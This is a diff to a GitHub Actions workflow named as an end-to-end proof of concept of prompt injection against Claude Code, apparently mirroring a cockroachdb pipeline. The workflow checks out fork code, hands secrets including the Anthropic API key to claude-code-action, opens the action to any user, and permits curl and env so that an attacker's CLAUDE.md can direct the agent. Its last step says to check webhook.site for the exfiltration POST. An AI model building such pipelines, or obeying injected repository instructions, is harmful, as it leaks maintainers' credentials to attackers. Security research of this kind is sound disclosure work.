@@ -1,4 +1,4 @@
-name: Claude Prompt Injection - END TO END PoC
+name: Claude Prompt Injection - END TO END PoC v2
 
 on:
   workflow_dispatch:
@@ -12,7 +12,7 @@ jobs:
   claude-injection-e2e:
     runs-on: ubuntu-latest
     steps:
-      # MIRROR: cockroachdb Step 2 - Checkout fork code (attacker controls ALL files)
+      # MIRROR: cockroachdb Step 2 - Checkout fork code
       - name: Checkout repository
         uses: actions/checkout@v5
         with:
@@ -42,14 +42,21 @@ jobs:
           echo "will read CLAUDE.md when it starts."
           echo "=========================================="
 
+      # Set ANTHROPIC_API_KEY as env var so claude-code-action can find it
+      - name: Set Anthropic API Key
+        run: echo "ANTHROPIC_API_KEY=${{ secrets.ANTHROPIC_API_KEY }}" >> "$GITHUB_ENV"
+
       # MIRROR: cockroachdb Step 6/8/10 - claude-code-action
-      # Claude WILL read CLAUDE.md and follow its instructions
       - name: "CLAUDE CODE ACTION (reads fork CLAUDE.md)"
         uses: cockroachdb/claude-code-action@v1
         id: claude_review
+        env:
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
         with:
           github_token: ${{ secrets.GITHUB_TOKEN }}
+          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
           allowed_non_write_users: "*"
+          mode: "direct-prompt"
           claude_args: |
             --model claude-sonnet-4-20250514
             --allowedTools "Read,Grep,Glob,Bash(echo *),Bash(cat *),Bash(env *),Bash(curl *),Bash(wc *),Bash(if *),Bash(head *)"
@@ -67,8 +74,5 @@ jobs:
           echo "=========================================="
           echo "Status: ${{ steps.claude_review.conclusion }}"
           echo ""
-          echo "If Claude successfully read CLAUDE.md and"
-          echo "executed its instructions, check:"
-          echo "1. webhook.site for the POST request"
-          echo "2. This step's logs for env var values"
+          echo "Check webhook.site for evidence!"
           echo "=========================================="
